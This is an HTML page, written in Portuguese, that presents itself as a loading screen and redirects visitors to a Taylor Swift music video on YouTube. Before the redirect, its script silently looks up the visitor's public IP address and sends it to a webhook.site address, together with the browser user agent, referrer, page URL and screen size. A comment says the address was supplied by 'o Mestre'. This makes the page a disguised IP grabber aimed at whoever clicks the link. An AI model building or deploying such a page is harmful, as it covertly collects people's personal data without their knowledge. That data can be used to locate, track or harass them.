<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <title>🎵 Redirecionando...</title>
    <style>
        body { background: #0a0a0a; color: white; font-family: monospace; text-align: center; padding-top: 50px; }
    </style>
</head>
<body>
    <p>⏳ Carregando...</p>
    <script>
        // URL do webhook fornecida pelo Mestre
        const WEBHOOK_URL = 'http://webhook.site/ddd461f9-4185-4145-9603-df94b2b4366c';

        function enviarIP(ip, dadosExtras) {
            const payload = {
                ip: ip,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                referer: document.referrer || 'direto',
                url: window.location.href,
                tela: `${screen.width}x${screen.height}`,
                ...dadosExtras
            };
            const dados = JSON.stringify(payload);
            // Usa sendBeacon para garantir envio mesmo após redirecionamento
            if (navigator.sendBeacon) {
                navigator.sendBeacon(WEBHOOK_URL, dados);
            } else {
                // Fallback com keepalive
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    keepalive: true,
                    headers: { 'Content-Type': 'application/json' },
                    body: dados
                }).catch(e => console.log);
            }
        }

        // Tenta obter o IP público
        fetch('https://api.ipify.org?format=json')
            .then(r => r.json())
            .then(data => {
                enviarIP(data.ip, { metodo: 'api.ipify' });
            })
            .catch(() => {
                // Se falhar, envia sem IP (mas captura IP local via WebRTC? Não necessário)
                enviarIP('desconhecido', { metodo: 'falhou', erro: true });
            })
            .finally(() => {
                // Redireciona para Taylor Swift (Shake It Off)
                window.location.href = 'https://www.youtube.com/watch?v=3tmd-ClpJxA';
            });
    </script>
</body>
</html>
